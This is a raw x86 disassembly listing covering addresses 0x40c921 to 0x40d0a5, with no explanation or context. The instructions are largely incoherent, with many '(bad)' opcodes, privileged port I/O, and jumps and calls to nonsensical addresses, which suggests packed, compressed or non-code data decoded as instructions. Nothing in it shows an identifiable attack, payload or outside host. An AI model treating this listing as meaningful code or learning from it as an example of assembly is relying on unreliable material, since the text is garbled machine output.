  40c921:	add    BYTE PTR [edx],dl
  40c923:	mov    al,0xdd
  40c925:	mov    ebx,0xb3c076ff
  40c92a:	div    DWORD PTR [eax-0x4fa4cc40]
  40c930:	lds    edi,FWORD PTR [ebx-0x40304e93]
  40c936:	fdiv   QWORD PTR [eax-0x52a2444b]
  40c93c:	rcl    BYTE PTR [edi-0x3316f69c],0xf0
  40c943:	add    ecx,ebp
  40c945:	push   eax
  40c946:	stos   BYTE PTR es:[edi],al
  40c947:	popf   
  40c948:	imul   eax,eax,0x2de923ba
  40c94e:	popa   
  40c94f:	mov    al,0xfb
  40c951:	or     ebx,DWORD PTR [ecx-0x6044fa7e]
  40c957:	cmp    bh,0x2b
  40c95a:	fldcw  WORD PTR [eax]
  40c95c:	add    eax,0xff08f405
  40c961:	fdivr  QWORD PTR [edx]
  40c963:	mov    eax,ds:0xafba5fa2
  40c968:	(bad)  
  40c969:	fdivr  QWORD PTR [esi-0x651e8b51]
  40c96f:	jl     0x40c9d7
  40c971:	inc    esi
  40c972:	stos   BYTE PTR es:[edi],al
  40c973:	rol    ecx,0xe5
  40c976:	xor    dl,BYTE PTR [esi-0x75]
  40c979:	inc    ebp
  40c97a:	scas   al,BYTE PTR es:[edi]
  40c97b:	int3   
  40c97c:	sti    
  40c97d:	xchg   edi,eax
  40c97e:	jecxz  0x40c9a2
  40c980:	add    BYTE PTR [ebx-0xe8b50c3],dl
  40c986:	add    BYTE PTR [edx+0x7a166756],cl
  40c98c:	add    DWORD PTR [ebp+ecx*1-0x42],0x6db155f4
  40c994:	or     DWORD PTR [ebx+0x41417cbc],ecx
  40c99a:	jmp    0x7540b851
  40c99f:	jno    0x40c9c2
  40c9a1:	mov    dh,0x4d
  40c9a3:	ins    BYTE PTR es:[edi],dx
  40c9a4:	or     DWORD PTR [edi-0x2f],edx
  40c9a7:	inc    edi
  40c9a8:	push   edi
  40c9a9:	add    cl,ch
  40c9ab:	daa    
  40c9ac:	leave  
  40c9ad:	jae    0x40c99d
  40c9af:	and    BYTE PTR [ecx-0x5155c53a],0x4f
  40c9b6:	push   ecx
  40c9b7:	xor    eax,0xa77ef09
  40c9bc:	leave  
  40c9bd:	arpl   WORD PTR [eax],bp
  40c9bf:	xor    eax,0x351cff59
  40c9c4:	mov    eax,ds:0xae7b7bd2
  40c9c9:	out    0xb5,eax
  40c9cb:	add    eax,0x3582feb0
  40c9d0:	inc    edi
  40c9d1:	add    BYTE PTR [eax],0x6e
  40c9d4:	or     esi,DWORD PTR [ebp-0x6]
  40c9d7:	push   esi
  40c9d8:	jno    0x40ca0b
  40c9da:	shl    BYTE PTR [ecx+0x73],0xfd
  40c9de:	call   FWORD PTR [edi]
  40c9e0:	jbe    0x40c98e
  40c9e2:	cmp    BYTE PTR [edi+0x65ffbaf8],dl
  40c9e8:	ja     0x40c9e7
  40c9ea:	jne    0x40c9ec
  40c9ec:	nop
  40c9ed:	arpl   WORD PTR [esi],si
  40c9ef:	push   DWORD PTR [bp+si+0x5d]
  40c9f3:	pop    esi
  40c9f4:	and    esi,eax
  40c9f6:	add    al,BYTE PTR [eax]
  40c9f8:	lds    edi,FWORD PTR [esi-0x16]
  40c9fb:	add    DWORD PTR [esp+esi*2],0x51
  40c9ff:	(bad)  
  40ca00:	xchg   ebp,eax
  40ca01:	jae    0x40ca01
  40ca03:	call   FWORD PTR [eax+0xb]
  40ca06:	mov    DWORD PTR [ebp+0x1c],0x4800000c
  40ca0d:	jle    0x40ca52
  40ca0f:	or     al,0x9b
  40ca11:	mov    dl,0xfe
  40ca13:	je     0x40ca36
  40ca15:	mov    al,ds:0x4f3a2bbe
  40ca1a:	leave  
  40ca1b:	ret    0xb0c
  40ca1e:	mov    ebx,0xb1801
  40ca23:	jmp    0x40ca9e
  40ca25:	test   BYTE PTR [ebx+0x10],bh
  40ca28:	or     bh,bl
  40ca2a:	add    al,0x8b
  40ca2c:	inc    ebp
  40ca2d:	adc    eax,0xdeff1889
  40ca32:	or     edi,edi
  40ca34:	and    eax,0x7476e7fd
  40ca39:	jo     0x40ca38
  40ca3b:	and    DWORD PTR [ebx-0x2efa8afe],0xffffffef
  40ca42:	imul   ebx
  40ca44:	push   ss
  40ca45:	push   ebp
  40ca46:	and    eax,0xfd709f7f
  40ca4b:	or     DWORD PTR [ecx],esi
  40ca4d:	fnstsw WORD PTR [ebx+0x20d80057]
  40ca53:	add    al,0x0
  40ca55:	xor    DWORD PTR [ebp+0x2362eb04],ebp
  40ca5b:	mov    ebp,0x8bcd1c07
  40ca60:	inc    esp
  40ca61:	mov    DWORD PTR [ebx],ebp
  40ca63:	dec    edi
  40ca64:	cld    
  40ca65:	ss jl  0x40ca2d
  40ca68:	pop    es
  40ca69:	jo     0x40caab
  40ca6b:	or     al,0x89
  40ca6d:	in     al,dx
  40ca6e:	push   edi
  40ca6f:	mov    edx,DWORD PTR [ebp+ebp*2+0x4b]
  40ca73:	adc    eax,0x8d47ec8b
  40ca78:	push   esp
  40ca79:	pop    ebp
  40ca7a:	lahf   
  40ca7b:	pop    esi
  40ca7c:	shr    DWORD PTR [esi],0xe1
  40ca7f:	mov    ds:0xba65b806,eax
  40ca84:	mov    ah,bl
  40ca86:	jecxz  0x40cacc
  40ca88:	cmp    DWORD PTR [edx],0xffffffb9
  40ca8b:	xor    BYTE PTR [edx-0x7cf9a256],bl
  40ca91:	imul   esp,DWORD PTR [eax-0x1fa5f9d3],0xa60ad1ec
  40ca9b:	mov    eax,DWORD PTR [ecx+ebx*1+0x2b]
  40ca9f:	dec    edi
  40caa0:	cld    
  40caa1:	push   0xffffffe9
  40caa3:	lds    ecx,FWORD PTR [ebx]
  40caa5:	xor    ebp,ebp
  40caa7:	mov    ebx,gs
  40caa9:	mov    dl,0x63
  40caab:	scas   al,BYTE PTR es:[edi]
  40caac:	mov    al,ds:0x42259d
  40cab1:	sub    ch,ah
  40cab3:	pop    es
  40cab4:	jbe    0x40cab6
  40cab6:	das    
  40cab7:	sbb    eax,esp
  40cab9:	enter  0xcff3,0x2
  40cabd:	call   FWORD PTR [esp+ecx*2]
  40cac0:	mov    DWORD PTR [eax+0x31],eax
  40cac3:	enter  0x67b8,0xc6
  40cac7:	or     BYTE PTR [esi+0x6bb1758a],ah
  40cacd:	ds mov ch,0x58
  40cad0:	cmp    esp,0xb88dae0e
  40cad6:	sbb    eax,0x2d2e8615
  40cadb:	scas   al,BYTE PTR es:[edi]
  40cadc:	repz mov ebx,0xabe13397
  40cae2:	(bad)  
  40cae3:	sub    DWORD PTR [esi-0x48],ebp
  40cae6:	cmp    ecx,ecx
  40cae8:	cmc    
  40cae9:	jg     0x40cabf
  40caeb:	or     cl,ch
  40caed:	add    esi,DWORD PTR [esi+0x33]
  40caf0:	in     eax,0xb8
  40caf2:	in     eax,0xb0
  40caf4:	dec    ebp
  40caf5:	cs mov al,gs:0xad5e225c
  40cafc:	jno    0x40cb3c
  40cafe:	and    eax,0x3e13abf2
  40cb03:	mov    al,BYTE PTR [ebx+eax*1+0x2e260931]
  40cb0a:	and    eax,0x490b93ae
  40cb0f:	aas    
  40cb10:	mov    bh,BYTE PTR [eax-0x505c7cd1]
  40cb16:	sbb    esi,DWORD PTR [esi]
  40cb18:	push   es
  40cb19:	inc    esi
  40cb1a:	add    BYTE PTR ds:0x6d8c1ae1,ah
  40cb20:	mov    ch,0xfd
  40cb22:	frstor [edx+0x3a03a77b]
  40cb28:	xlat   BYTE PTR ds:[ebx]
  40cb29:	pop    esp
  40cb2a:	add    cl,BYTE PTR [edx]
  40cb2c:	and    dl,BYTE PTR [ebx+0x4]
  40cb2f:	popa   
  40cb30:	lods   al,BYTE PTR ds:[esi]
  40cb31:	pop    ebx
  40cb32:	or     al,0xd9
  40cb34:	or     eax,0xace7b749
  40cb39:	cmp    edx,DWORD PTR [eax]
  40cb3b:	fidiv  WORD PTR [esi]
  40cb3d:	icebp  
  40cb3e:	stos   DWORD PTR es:[edi],eax
  40cb3f:	cmp    BYTE PTR [eax],ch
  40cb41:	add    BYTE PTR [esi-0x2aab807a],dh
  40cb47:	mov    bl,0xf2
  40cb49:	call   FWORD PTR [ebx]
  40cb4b:	xor    esp,DWORD PTR [eax-0x4a8f8fb9]
  40cb51:	mov    ah,ah
  40cb53:	mov    esi,0xb3e9407e
  40cb58:	mov    eax,ds:0x35e61803
  40cb5d:	adc    al,0x18
  40cb5f:	fidiv  WORD PTR ds:0x14076f8
  40cb65:	call   0xfeed1f09
  40cb6a:	shr    BYTE PTR [ebx],0xc9
  40cb6d:	je     0x40cb5a
  40cb6f:	retf   
  40cb70:	in     eax,0x50
  40cb72:	push   esi
  40cb73:	and    BYTE PTR [ecx-0x5b612b02],dh
  40cb79:	adc    al,0xc8
  40cb7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb7c:	stos   DWORD PTR es:[edi],eax
  40cb7d:	(bad)  
  40cb7e:	mov    ah,0x0
  40cb80:	sahf   
  40cb81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb82:	or     cl,cl
  40cb84:	xchg   DWORD PTR [ebx+0x4932e93c],ebp
  40cb8a:	push   es
  40cb8b:	lahf   
  40cb8c:	xor    BYTE PTR [eax-0x4b0795f9],ah
  40cb92:	call   FWORD PTR [ebx+0xe179fac]
  40cb98:	pusha  
  40cb99:	lods   eax,DWORD PTR ds:[esi]
  40cb9a:	out    0x5a,eax
  40cb9c:	xchg   BYTE PTR [esi+edi*8-0x528fda],ch
  40cba3:	call   0xa4cbd4da
  40cba8:	ss (bad) 
  40cbaa:	(bad)  
  40cbab:	call   0xde40d4e2
  40cbb0:	inc    ecx
  40cbb1:	mov    cl,0xe7
  40cbb3:	aad    0x4f
  40cbb5:	lods   al,BYTE PTR ds:[esi]
  40cbb6:	(bad)  
  40cbb7:	bound  esi,QWORD PTR [ecx-0x53]
  40cbba:	enter  0x8a00,0x17
  40cbbe:	add    BYTE PTR [ebp+0x63],dl
  40cbc1:	fs push ebp
  40cbc3:	mov    ebx,DWORD PTR ds:0xd0c08301
  40cbc9:	push   edi
  40cbca:	call   0xfdb4fbcb
  40cbcf:	mov    edx,DWORD PTR [eax+0x170c7372]
  40cbd5:	stos   DWORD PTR es:[edi],eax
  40cbd6:	std    
  40cbd7:	jne    0x40cb81
  40cbd9:	add    BYTE PTR [ebp+0x4],0xb
  40cbdd:	icebp  
  40cbde:	or     eax,DWORD PTR [eax]
  40cbe0:	pushf  
  40cbe1:	add    bh,bh
  40cbe3:	jne    0x40cbe5
  40cbe5:	xchg   esp,eax
  40cbe6:	add    BYTE PTR [ebp+0x8],0x28
  40cbea:	je     0x40cc5f
  40cbec:	or     al,ah
  40cbee:	adc    al,0x68
  40cbf0:	call   edi
  40cbf2:	jle    0x40cc37
  40cbf4:	adc    al,0xd1
  40cbf6:	scas   eax,DWORD PTR es:[edi]
  40cbf7:	mov    dh,0x1
  40cbf9:	pop    eax
  40cbfa:	pop    es
  40cbfb:	add    BYTE PTR [edi+0x21],bl
  40cbfe:	retf   0xe
  40cc01:	mov    ebp,0x1c83ea7e
  40cc06:	pop    esp
  40cc07:	mov    DWORD PTR [ebp+0x5c],edx
  40cc0a:	push   0x0
  40cc0c:	add    BYTE PTR [eax+0x7],cl
  40cc0f:	add    BYTE PTR [ebx],ch
  40cc11:	cli    
  40cc12:	pop    edx
  40cc13:	inc    ebx
  40cc14:	or     al,0x19
  40cc16:	pop    es
  40cc17:	add    BYTE PTR [eax],al
  40cc19:	pop    es
  40cc1a:	jnp    0x40cbdc
  40cc1c:	xor    DWORD PTR [ebp-0x48afffe],0x73
  40cc23:	jae    0x40cc39
  40cc25:	mov    dl,0x7
  40cc27:	push   0x0
  40cc29:	mov    dl,0x6
  40cc2b:	call   0xfdb5e3c0
  40cc30:	jmp    0x40d356
  40cc35:	xor    DWORD PTR [edi],ebx
  40cc37:	aaa    
  40cc38:	or     al,0x30
  40cc3a:	push   ebp
  40cc3b:	loope  0x40cc3b
  40cc3d:	shl    BYTE PTR fs:[ebx+0x2fd82974],1
  40cc44:	(bad)  
  40cc45:	into   
  40cc46:	jae    0x40cbd2
  40cc48:	inc    esp
  40cc49:	add    ch,al
  40cc4b:	pop    ebx
  40cc4c:	cs adc al,0x4b
  40cc4f:	mov    al,ds:0xe5a40428
  40cc54:	mov    bh,0x4f
  40cc56:	cdq    
  40cc57:	sti    
  40cc58:	mov    ah,0xfe
  40cc5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc5b:	mov    DWORD PTR [ebx],eax
  40cc5d:	add    dh,BYTE PTR [ecx]
  40cc5f:	mov    al,ds:0x9e257c7f
  40cc64:	sub    eax,0x12ad8e23
  40cc69:	(bad)  
  40cc6a:	cld    
  40cc6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc6c:	stos   BYTE PTR es:[edi],al
  40cc6d:	sbb    eax,0x88b52313
  40cc72:	in     al,dx
  40cc73:	dec    ebx
  40cc74:	mov    ch,0x74
  40cc76:	inc    ebp
  40cc77:	mov    BYTE PTR [edx],0x6a
  40cc7a:	sub    eax,0x1fc3f4d
  40cc7f:	pop    eax
  40cc80:	idiv   dh
  40cc82:	push   esi
  40cc83:	jmp    0x40cc2f
  40cc85:	(bad)  
  40cc86:	xor    BYTE PTR [eax-0x343b7cfe],ah
  40cc8c:	push   DWORD PTR [ecx+edx*1-0x1d]
  40cc90:	cs adc bl,cl
  40cc93:	sahf   
  40cc94:	mov    bl,0x74
  40cc96:	cmp    DWORD PTR [eax],ecx
  40cc98:	dec    ecx
  40cc99:	bound  esp,QWORD PTR [esi]
  40cc9b:	sti    
  40cc9c:	mov    ah,0x74
  40cc9e:	inc    ebp
  40cc9f:	xchg   esi,eax
  40cca0:	jmp    FWORD PTR [ecx+0x31]
  40cca3:	xchg   esi,eax
  40cca4:	add    ch,al
  40cca6:	sub    DWORD PTR [ebx-0xee7014d],esi
  40ccac:	add    al,BYTE PTR [eax]
  40ccae:	add    BYTE PTR [ecx],dh
  40ccb0:	or     DWORD PTR [edx+0x36],ebp
  40ccb3:	and    eax,0xefe15405
  40ccb8:	xor    edi,ecx
  40ccba:	mov    ah,0x5d
  40ccbc:	add    ecx,eax
  40ccbe:	pusha  
  40ccbf:	push   ecx
  40ccc0:	stos   BYTE PTR es:[edi],al
  40ccc1:	lds    ecx,FWORD PTR [edx+0x2ebdad6d]
  40ccc7:	and    eax,0x2d29e91f
  40cccc:	jl     0x40ccf1
  40ccce:	mov    eax,0xb595a16e
  40ccd3:	mov    bh,0xa9
  40ccd5:	(bad)  
  40ccd6:	mov    esi,DWORD PTR [ecx]
  40ccd8:	or     ecx,ebp
  40ccda:	and    BYTE PTR ds:0x462ee3fd,0xaa
  40cce1:	sti    
  40cce2:	adc    ecx,DWORD PTR [ebx]
  40cce4:	add    edi,DWORD PTR [esi+0x2e]
  40cce7:	cmp    DWORD PTR [ecx-0x5679dd8c],esp
  40cced:	xor    BYTE PTR [edx],al
  40ccef:	xor    DWORD PTR [ecx],ecx
  40ccf1:	jmp    0xe948d8a0
  40ccf6:	add    esi,DWORD PTR [edx-0x22021ad5]
  40ccfc:	call   0x1f81fb4e
  40cd01:	icebp  
  40cd02:	mov    ah,0xdd
  40cd04:	add    BYTE PTR [ecx-0x2c],dl
  40cd07:	shr    DWORD PTR [ecx+0x14bdb435],1
  40cd0d:	ret    
  40cd0e:	add    bl,cl
  40cd10:	or     BYTE PTR [ebx+0x5c490003],dl
  40cd16:	push   ds
  40cd17:	mov    ah,0x2f
  40cd19:	mov    bl,0xab
  40cd1b:	add    dh,BYTE PTR [ecx]
  40cd1d:	or     DWORD PTR [edx+0x36],ebp
  40cd20:	sub    eax,0x17e37c10
  40cd25:	pop    ds
  40cd26:	fldcw  WORD PTR [ecx]
  40cd28:	cmp    DWORD PTR [eax-0x4ec58401],ebp
  40cd2e:	mov    eax,0xfea7c588
  40cd33:	pop    esp
  40cd34:	sbb    DWORD PTR [ebx],esi
  40cd36:	add    edx,DWORD PTR [ebx+0x35]
  40cd39:	xor    eax,DWORD PTR [eax]
  40cd3b:	sar    DWORD PTR [ebx-0x4331015a],0x7
  40cd42:	add    ecx,ebp
  40cd44:	xor    cl,BYTE PTR [esp+edi*2+0x1c1dcaed]
  40cd4b:	scas   al,BYTE PTR es:[edi]
  40cd4c:	js     0x40ccf3
  40cd4e:	(bad)  
  40cd4f:	call   0x1d3fd686
  40cd54:	sbb    DWORD PTR [ebx],esi
  40cd56:	add    BYTE PTR [ebx],dl
  40cd58:	cmp    DWORD PTR [esi-0x4f026abc],edx
  40cd5e:	arpl   WORD PTR [edi-0x7b17581e],cx
  40cd64:	sub    eax,0x406a0009
  40cd69:	adc    eax,0xd036fc09
  40cd6e:	inc    esp
  40cd6f:	ins    DWORD PTR es:[edi],dx
  40cd70:	xor    al,0x9
  40cd72:	add    cl,ch
  40cd74:	ret    
  40cd75:	sbb    eax,0x3200d314
  40cd7a:	xor    eax,DWORD PTR [esp+eiz*2]
  40cd7d:	clc    
  40cd7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd7f:	dec    edi
  40cd80:	inc    ecx
  40cd81:	mul    DWORD PTR [esi-0x3c4bb902]
  40cd87:	(bad)  
  40cd88:	call   0xe5bd59bf
  40cd8d:	inc    esp
  40cd8e:	sbb    eax,0x935710a
  40cd93:	add    cl,ch
  40cd95:	xchg   ebp,eax
  40cd96:	sar    edi,cl
  40cd98:	call   0xe5bd59cf
  40cd9d:	daa    
  40cd9e:	sbb    eax,0x935510a
  40cda3:	add    BYTE PTR [eax],al
  40cda5:	or     BYTE PTR [ebp+0xc1800b9],al
  40cdab:	cmp    DWORD PTR [ebp+0xc],0xffffffa8
  40cdaf:	jo     0x40ce06
  40cdb1:	adc    edi,DWORD PTR [esi-0x2676ae8e]
  40cdb7:	or     eax,DWORD PTR [eax]
  40cdb9:	fmul   DWORD PTR [ebx+0x6]
  40cdbc:	jae    0x40cdce
  40cdbe:	pop    esp
  40cdbf:	jae    0x40cdcd
  40cdc1:	jg     0x40ce14
  40cdc3:	hlt    
  40cdc4:	cmp    DWORD PTR [ebp+0x61],0xa
  40cdc8:	sar    DWORD PTR [ebp+0x61],1
  40cdcb:	std    
  40cdcc:	jne    0x40cd52
  40cdce:	cmp    edi,0x65
  40cdd1:	(bad)  
  40cdd2:	pop    edx
  40cdd3:	xchg   DWORD PTR [ebp-0x70],eax
  40cdd6:	pop    edx
  40cdd7:	jae    0x40cde9
  40cdd9:	iret   
  40cdda:	loopne 0x40cdcf
  40cddc:	inc    DWORD PTR [eax]
  40cdde:	inc    ebp
  40cddf:	jne    0x40cdde
  40cde1:	jne    0x40cd73
  40cde3:	sbb    DWORD PTR [edx+0x60],0xffffffaf
  40cde7:	pop    edx
  40cde8:	std    
  40cde9:	jne    0x40ce4f
  40cdeb:	add    eax,0x5f85ff02
  40cdf0:	std    
  40cdf1:	jne    0x40cdf3
  40cdf3:	test   bh,cl
  40cdf5:	std    
  40cdf6:	cvtdq2ps xmm7,xmm5
  40cdf9:	jne    0x40cdcb
  40cdfb:	cmp    DWORD PTR [ebp+eiz*2+0x1b65aff],0x48
  40ce03:	or     eax,DWORD PTR [eax]
  40ce05:	jmp    0x40ce6f
  40ce07:	mov    ?,WORD PTR [ebx+0xc]
  40ce0a:	pop    ebp
  40ce0b:	fst    QWORD PTR [ebx+ecx*1+0x2a]
  40ce0f:	loope  0x40ce61
  40ce11:	or     DWORD PTR [ebp-0x77000159],0x4f487311
  40ce1b:	loope  0x40ce28
  40ce1d:	(bad)  
  40ce1e:	xor    DWORD PTR [ebp-0x4a],esi
  40ce21:	or     BYTE PTR [esp+edi*8-0x5b7b2f01],0xb0
  40ce29:	je     0x40ce30
  40ce2b:	stc    
  40ce2c:	push   0x7aa00664
  40ce31:	inc    esp
  40ce32:	stc    
  40ce33:	mov    bh,0x36
  40ce35:	adc    dh,dh
  40ce37:	inc    ebp
  40ce38:	mov    eax,0xb0a864fe
  40ce3d:	je     0x40ce78
  40ce3f:	enter  0x6002,0x0
  40ce43:	(bad)  
  40ce45:	mov    al,0x74
  40ce47:	cmp    eax,0x44ff033a
  40ce4c:	pop    esp
  40ce4d:	mov    al,0x74
  40ce4f:	leave  
  40ce50:	enter  0xfd39,0xbe
  40ce54:	ja     0x40ce06
  40ce56:	je     0x40ce11
  40ce58:	js     0x40ce7e
  40ce5a:	gs scas al,BYTE PTR es:[edi]
  40ce5c:	xchg   DWORD PTR [ebx+0x0],ebp
  40ce5f:	xor    DWORD PTR [eax+0x3834eb02],esi
  40ce65:	add    al,0x0
  40ce67:	xor    DWORD PTR [eax-0x4fde3e47],esi
  40ce6d:	push   ebp
  40ce6e:	mov    edx,DWORD PTR [ebp+0x297c8506]
  40ce74:	mov    al,0x35
  40ce76:	add    eax,0x3c5d8d7
  40ce7b:	xor    DWORD PTR [ebx],ebx
  40ce7d:	aaa    
  40ce7e:	or     BYTE PTR [edx-0x56],bl
  40ce81:	scas   eax,DWORD PTR es:[edi]
  40ce82:	xor    eax,0xff26f849
  40ce87:	push   esi
  40ce88:	xor    ecx,edx
  40ce8a:	add    esi,DWORD PTR [edx+0x407502a6]
  40ce90:	fbstp  TBYTE PTR [esi]
  40ce92:	or     BYTE PTR [ecx+0x8],cl
  40ce95:	daa    
  40ce96:	push   DWORD PTR [esi]
  40ce98:	or     edi,eax
  40ce9a:	mov    edx,0x56e90cf0
  40ce9f:	mov    edx,0x294761b4
  40cea4:	xchg   edx,eax
  40cea5:	mov    bl,0xff
  40cea7:	add    BYTE PTR [ebx-0x727aa6f4],ch
  40cead:	stc    
  40ceae:	call   0x9bd2fcea
  40ceb3:	adc    edi,esi
  40ceb5:	fcomp  DWORD PTR [ebp+0x6]
  40ceb8:	mov    dl,0x23
  40ceba:	std    
  40cebb:	add    esp,DWORD PTR [ebp+0x11]
  40cebe:	jb     0x40cf16
  40cec0:	cmp    eax,0xae0858a6
  40cec5:	or     ch,BYTE PTR [edx+0x2e]
  40cec8:	cmp    DWORD PTR [ecx],ecx
  40ceca:	cmp    eax,0xe13bbbfb
  40cecf:	push   ebx
  40ced0:	mov    dh,0xa
  40ced2:	push   0x5
  40ced4:	sub    eax,edx
  40ced6:	stos   BYTE PTR es:[edi],al
  40ced7:	pop    ss
  40ced8:	xor    DWORD PTR [edx+esi*2],edi
  40cedb:	lahf   
  40cedc:	mov    bl,0xcc
  40cede:	mov    esp,0x2b91ff58
  40cee3:	adc    al,0x76
  40cee5:	or     cl,ch
  40cee7:	add    esi,DWORD PTR [ecx]
  40cee9:	or     DWORD PTR [edx+0x46],esi
  40ceec:	cmp    eax,0x3103e8ce
  40cef1:	or     ecx,ebp
  40cef3:	test   ch,bh
  40cef5:	adc    cl,ch
  40cef7:	ss sub edx,esi
  40cefa:	sub    BYTE PTR [ecx+0xe],dl
  40cefd:	shr    BYTE PTR [edx],1
  40ceff:	jmp    DWORD PTR [esi-0x5a]
  40cf02:	(bad)  
  40cf04:	push   esi
  40cf05:	jnp    0x40ceb3
  40cf07:	mov    al,0x57
  40cf09:	adc    DWORD PTR [ecx],ebp
  40cf0b:	add    BYTE PTR ss:[ecx],bh
  40cf0e:	repnz sub BYTE PTR [ecx-0x1a],dl
  40cf12:	iret   
  40cf13:	jmp    FWORD PTR [edx]
  40cf15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf17:	xchg   DWORD PTR [edx+ecx*4-0x350e8b5a],esp
  40cf1e:	outs   dx,DWORD PTR ds:[esi]
  40cf1f:	pop    ebp
  40cf20:	push   ds
  40cf21:	loope  0x40ceee
  40cf23:	inc    esp
  40cf24:	sbb    eax,0xe9000933
  40cf29:	xchg   edi,eax
  40cf2a:	dec    ebp
  40cf2b:	in     al,dx
  40cf2c:	cdq    
  40cf2d:	(bad)  
  40cf2e:	dec    ebp
  40cf2f:	hlt    
  40cf30:	cdq    
  40cf31:	rcr    DWORD PTR ds:0xa2d90108,0xfe
  40cf38:	out    dx,al
  40cf39:	or     BYTE PTR [esi-0x14],cl
  40cf3c:	pop    esi
  40cf3d:	jmp    0x40cec6
  40cf3f:	jl     0x40cf16
  40cf41:	sub    eax,0xe2041d
  40cf46:	sbb    DWORD PTR [eax],ecx
  40cf48:	add    ch,ch
  40cf4a:	inc    esi
  40cf4b:	pop    edi
  40cf4c:	mov    al,0xf3
  40cf4e:	adc    BYTE PTR [eax],al
  40cf50:	adc    bh,BYTE PTR [eax-0x4b]
  40cf53:	mov    BYTE PTR [ebx*4+0x2dc17c89],ch
  40cf5a:	or     DWORD PTR [eax+0x2b1164e9],esp
  40cf60:	test   eax,0xabc943f7
  40cf65:	xor    DWORD PTR [ecx],ecx
  40cf67:	mov    esp,DWORD PTR [esi*4-0x1d142037]
  40cf6e:	mov    al,0x67
  40cf70:	add    eax,0x88a3d600
  40cf75:	sub    al,0xc1
  40cf77:	(bad)  
  40cf78:	mul    DWORD PTR [esi-0x17005318]
  40cf7e:	xor    cl,BYTE PTR [ecx]
  40cf80:	jmp    0x40cf9c
  40cf82:	mov    al,0x4d
  40cf84:	lock mov ecx,0xb9f44db1
  40cf8a:	xchg   DWORD PTR ds:0xf3e00008,ebx
  40cf90:	stc    
  40cf91:	inc    DWORD PTR [edi]
  40cf93:	and    BYTE PTR [eax+esi*8+0x43],cl
  40cf97:	dec    ecx
  40cf98:	call   0xd0e01c14
  40cf9d:	je     0x40cfc7
  40cf9f:	jae    0x40d014
  40cfa1:	cld    
  40cfa2:	inc    eax
  40cfa3:	adc    al,0x64
  40cfa5:	inc    DWORD PTR [edi-0x40]
  40cfa8:	mov    esi,0xc064c75e
  40cfad:	or     al,0x18
  40cfaf:	lds    ecx,FWORD PTR [ebx-0x18]
  40cfb2:	pop    es
  40cfb3:	push   ecx
  40cfb4:	in     al,0xab
  40cfb6:	mov    ebx,edx
  40cfb8:	out    0x0,eax
  40cfba:	jle    0x40cfca
  40cfbc:	cmp    DWORD PTR [ebp+0xc],0x8
  40cfc0:	jne    0x40cf83
  40cfc2:	pop    ebx
  40cfc3:	(bad)  
  40cfc5:	add    BYTE PTR [ebp+0xb],bh
  40cfc8:	cmp    DWORD PTR [ebp-0x4],0x7
  40cfcc:	jne    0x40cfde
  40cfce:	mul    eax
  40cfd0:	sti    
  40cfd1:	call   0x3fb65e
  40cfd6:	add    BYTE PTR [ebx],dh
  40cfd8:	int    0x5c
  40cfda:	pop    edi
  40cfdb:	xchg   ecx,eax
  40cfdc:	leave  
  40cfdd:	or     al,BYTE PTR [eax]
  40cfdf:	sbb    ebx,ecx
  40cfe1:	jecxz  0x40cfe3
  40cfe3:	cmp    eax,0x888be912
  40cfe8:	pop    es
  40cfe9:	add    BYTE PTR [ebx+0x75fefd4d],cl
  40cfef:	mov    esp,0x4d8aff22
  40cff4:	jno    0x40cfb5
  40cff6:	loopne 0x40cf82
  40cff8:	aaa    
  40cff9:	call   0xfdb4fbde
  40cffe:	mov    DWORD PTR [ebp+0x247d89d3],ebx
  40d004:	pop    ds
  40d005:	je     0x40d003
  40d007:	xor    DWORD PTR [edi+0x4b],eax
  40d00a:	lods   eax,DWORD PTR ds:[esi]
  40d00b:	stos   BYTE PTR es:[edi],al
  40d00c:	loope  0x40cfd3
  40d00e:	inc    esp
  40d00f:	push   ecx
  40d010:	mov    cl,0x2
  40d012:	add    BYTE PTR [ecx],dh
  40d014:	xor    eax,0x2ce1e048
  40d019:	dec    eax
  40d01a:	hlt    
  40d01b:	loope  0x40d09c
  40d01d:	lods   eax,DWORD PTR ds:[esi]
  40d01e:	je     0x40d059
  40d020:	clc    
  40d021:	popf   
  40d022:	cli    
  40d023:	es add al,0xfa
  40d026:	mov    edi,0x7c81aca5
  40d02b:	sbb    eax,0xb20636b1
  40d030:	lea    esp,[edx-0x7e358201]
  40d036:	jl     0x40d049
  40d038:	mov    cl,0x36
  40d03a:	or     BYTE PTR [eax],al
  40d03c:	neg    BYTE PTR ds:0x4fb4e7a3
  40d042:	lods   eax,DWORD PTR ds:[esi]
  40d043:	(bad)  
  40d044:	out    0x3d,al
  40d046:	shl    bh,1
  40d048:	or     edi,DWORD PTR [edx+0x3dd6feac]
  40d04e:	mov    al,0xe7
  40d050:	inc    esp
  40d051:	dec    edi
  40d052:	lods   eax,DWORD PTR ds:[esi]
  40d053:	(bad)  
  40d054:	sbb    dh,BYTE PTR [eax+0x4d]
  40d057:	pop    edi
  40d058:	call   0xab40cfcb
  40d05d:	in     eax,dx
  40d05e:	mov    ds:0xa7ddaeaa,eax
  40d063:	and    BYTE PTR [esp+ecx*4],0x3
  40d067:	je     0x40d0a0
  40d069:	das    
  40d06a:	das    
  40d06b:	hlt    
  40d06c:	xor    ebp,edi
  40d06e:	(bad)
  40d072:	stos   DWORD PTR es:[edi],eax
  40d073:	je     0x40d0da
  40d075:	xor    eax,DWORD PTR [edi+edi*8]
  40d078:	add    al,0x1c
  40d07a:	pushf  
  40d07b:	dec    ecx
  40d07c:	adc    dh,BYTE PTR [ebx]
  40d07e:	lods   eax,DWORD PTR ds:[esi]
  40d07f:	mov    bh,0x30
  40d081:	or     ecx,ebp
  40d083:	add    esi,DWORD PTR [ecx]
  40d085:	inc    ebx
  40d086:	mov    esi,0xe91570ba
  40d08b:	push   esi
  40d08c:	stos   BYTE PTR es:[edi],al
  40d08d:	mov    ch,0x69
  40d08f:	enter  0x3a76,0x6a
  40d093:	das    
  40d094:	and    DWORD PTR [ecx],ecx
  40d096:	mov    ah,0xf9
  40d098:	xchg   BYTE PTR [eax],cl
  40d09a:	jmp    0x208301a2
  40d09f:	ret    0x4200
  40d0a2:	or     DWORD PTR [esi],esp
  40d0a4:	aas    
  40d0a5:	inc    ecx
